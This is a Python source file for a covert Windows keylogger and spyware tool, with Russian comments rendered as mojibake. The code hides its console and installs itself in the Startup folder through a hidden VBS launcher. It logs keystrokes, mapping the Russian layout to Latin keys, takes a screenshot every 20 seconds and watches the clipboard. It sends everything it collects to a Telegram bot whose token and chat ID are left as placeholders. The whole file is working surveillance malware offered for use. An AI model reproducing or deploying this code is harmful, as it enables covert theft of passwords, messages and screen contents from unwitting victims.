import keyboard
import threading
import requests
import ctypes
import socket
import getpass
import pyautogui
import pyperclip
import time
import os
import sys

BOT_TOKEN = '–≤–∞—à —Ç–æ–∫–µ–Ω'
CHAT_ID = '–≤–∞—à –∞–π–¥–∏'
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
SEND_INTERVAL = 60
SCREEN_INTERVAL = 20

PC_NAME = socket.gethostname()
USER_NAME = getpass.getuser()
log_data = ""

# ----------------- –°–∫—Ä—ã—Ç–∏–µ –∫–æ–Ω—Å–æ–ª–∏ -----------------
def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

# ----------------- –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ -----------------
def add_to_startup_hidden():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(sys.argv[0])
    startup_dir = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    vbs_path = os.path.join(startup_dir, "launcher_hidden.vbs")

    # –ï—Å–ª–∏ —Ñ–∞–π–ª —É–∂–µ –µ—Å—Ç—å –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø—É—Ç—å ‚Äî –Ω–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞–µ–º
    if os.path.exists(vbs_path):
        try:
            with open(vbs_path, "r", encoding="utf-8") as f:
                if exe_path in f.read():
                    return True
        except:
            pass

    vbs_code = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """{exe_path}""", 0, False
'''
    try:
        temp_path = vbs_path + ".tmp"
        with open(temp_path, "w", encoding="utf-8") as f:
            f.write(vbs_code.strip())
        os.replace(temp_path, vbs_path)  # –±–µ–∑–æ–ø–∞—Å–Ω–∞—è –∑–∞–º–µ–Ω–∞
        print(f"[+] –°–∫—Ä—ã—Ç–∞—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ —Å–æ–∑–¥–∞–Ω–∞: {vbs_path}")
        return True
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Startup hidden error: " + str(e) + "\n")
        return False

# ----------------- –°–∫—Ä–∏–Ω—à–æ—Ç—ã -----------------
def take_screenshot():
    file_path = "screenshot.png"
    img = pyautogui.screenshot()
    img.save(file_path)
    return file_path

def send_file(file_path, caption=""):
    with open(file_path, "rb") as f:
        requests.post(API_URL + "/sendDocument",
                      data={"chat_id": CHAT_ID, "caption": caption},
                      files={"document": f})

def send_screenshot():
    while True:
        try:
            path = take_screenshot()
            send_file(path, caption=f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å {PC_NAME} ({USER_NAME})")
        except Exception as e:
            with open("error.log", "a", encoding="utf-8") as f:
                f.write("Screenshot error: " + str(e) + "\n")
        time.sleep(SCREEN_INTERVAL)

# ----------------- –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ -----------------
last_clipboard = ""
def clipboard_loop():
    global last_clipboard
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clipboard and clip.strip() != "":
                last_clipboard = clip
                requests.post(f"{API_URL}/sendMessage",
                              data={'chat_id': CHAT_ID,
                                    'text': f"üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞ ({PC_NAME}):\n{clip}"},
                              timeout=5)
        except:
            pass
        time.sleep(0.5)

# ----------------- –ö–µ–π–ª–æ–≥–≥–µ—Ä -----------------
rus_to_eng = {
    '–π':'q','—Ü':'w','—É':'e','–∫':'r','–µ':'t','–Ω':'y','–≥':'u','—à':'i','—â':'o','–∑':'p',
    '—Ö':'[','—ä':']','—Ñ':'a','—ã':'s','–≤':'d','–∞':'f','–ø':'g','—Ä':'h','–æ':'j','–ª':'k','–¥':'l','–∂':';','—ç':"'",
    '—è':'z','—á':'x','—Å':'c','–º':'v','–∏':'b','—Ç':'n','—å':'m','–±':',','—é':'.',
    '1':'1','2':'2','3':'3','4':'4','5':'5','6':'6','7':'7','8':'8','9':'9','0':'0',
    '!':'!','"':'@','‚Ññ':'#',';':'$','%':'%','?':'^',':':'&','*':'*','(':'(',' )':')',
    '.':'.',',':',','-':'-','/':'/','\\':'\\',' ':' '
}

ignored_keys = ['shift', 'ctrl', 'alt', 'caps lock', 'tab', 'windows', 'menu', 'left', 'right', 'up', 'down']

def on_key(event):
    global log_data
    try:
        name = event.name.lower()
        if name in ignored_keys:
            return
        if name == 'space':
            log_data += ' '
        elif name == 'enter':
            log_data += '\n'
        elif name == 'backspace':
            log_data = log_data[:-1]
        else:
            if name in rus_to_eng:
                log_data += rus_to_eng[name]
            elif len(name) == 1 and name.isascii() and name.isprintable():
                log_data += name
    except:
        pass

# ----------------- –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–æ–≤ -----------------
def send_log():
    global log_data
    try:
        if log_data.strip() != "":
            header = f"üìå –õ–æ–≥–∏ —Å –ü–ö: {PC_NAME} (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {USER_NAME})\n\n"
            chunks = [log_data[i:i+4000] for i in range(0, len(log_data), 4000)]
            for chunk in chunks:
                requests.post(f'{API_URL}/sendMessage',
                              data={'chat_id': CHAT_ID, 'text': header + chunk},
                              timeout=5)
            log_data = ""
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Send error: " + str(e) + "\n")
    threading.Timer(SEND_INTERVAL, send_log).start()

# ----------------- –ì–ª–∞–≤–Ω–∞—è —á–∞—Å—Ç—å -----------------
if __name__ == "__main__":
    add_to_startup_hidden()  # –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
    hide_console()
    send_log()
    threading.Thread(target=send_screenshot, daemon=True).start()
    threading.Thread(target=clipboard_loop, daemon=True).start()
    keyboard.on_press(on_key)
    keyboard.wait()





